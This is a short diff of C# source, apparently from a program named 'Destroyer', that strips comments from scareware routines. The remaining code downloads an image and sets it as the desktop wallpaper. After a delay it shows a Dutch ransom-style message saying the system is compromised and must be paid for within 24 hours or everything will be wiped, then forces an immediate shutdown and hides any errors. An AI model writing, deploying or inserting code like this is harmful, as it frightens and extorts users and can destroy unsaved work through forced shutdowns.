@@ -18,18 +18,12 @@ namespace Destroyer
         {
             try
             {
-                // 1. Download + zet achtergrond
                 string img = Path.Combine(Environment.GetEnvironmentVariable("TEMP"), "bg.jpg");
                 new System.Net.WebClient().DownloadFile("https://i.imgur.com/deOMvCU.jpeg", img);
                 Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true)?.SetValue("Wallpaper", img);
                 SystemParametersInfo(20, 0, img, 0x01 | 0x02);
-
                 Thread.Sleep(30000);
-
-                // 2. Melding
                 MessageBox(IntPtr.Zero, "Je systeem is gecompromitteerd. Betaal binnen 24 uur of alles wordt gewist.", "WAARSCHUWING", 0x10);
-
-                // 3. Shutdown
                 System.Diagnostics.Process.Start("shutdown", "/s /f /t 0");
             }
             catch { }
